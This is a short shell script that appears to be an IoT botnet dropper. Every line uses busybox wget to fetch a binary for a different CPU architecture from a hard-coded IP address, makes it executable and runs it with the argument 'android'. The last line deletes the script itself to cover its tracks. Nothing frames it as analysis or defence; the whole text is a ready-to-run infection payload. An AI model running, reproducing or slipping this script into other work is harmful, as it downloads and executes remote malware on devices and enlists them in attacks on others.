busybox wget http://198.12.70.38/arm; chmod 777 arm; ./arm android
busybox wget http://198.12.70.38/arm5; chmod 777 arm5; ./arm5 android
busybox wget http://198.12.70.38/arm6; chmod 777 arm6; ./arm6 android
busybox wget http://198.12.70.38/arm7; chmod 777 arm7; ./arm7 android
busybox wget http://198.12.70.38/m68k; chmod 777 m68k; ./m68k android
busybox wget http://198.12.70.38/mips; chmod 777 mips; ./mips android
busybox wget http://198.12.70.38/mpsl; chmod 777 mpsl; ./mpsl android
busybox wget http://198.12.70.38/ppc; chmod 777 ppc; ./ppc android
busybox wget http://198.12.70.38/sh4; chmod 777 sh4; ./sh4 android
busybox wget http://198.12.70.38/spc; chmod 777 spc; ./spc android
busybox wget http://198.12.70.38/x86; chmod 777 x86; ./x86 android
busybox wget http://198.12.70.38/x86_64; chmod 777 x86_64; ./x86_64 android

rm $0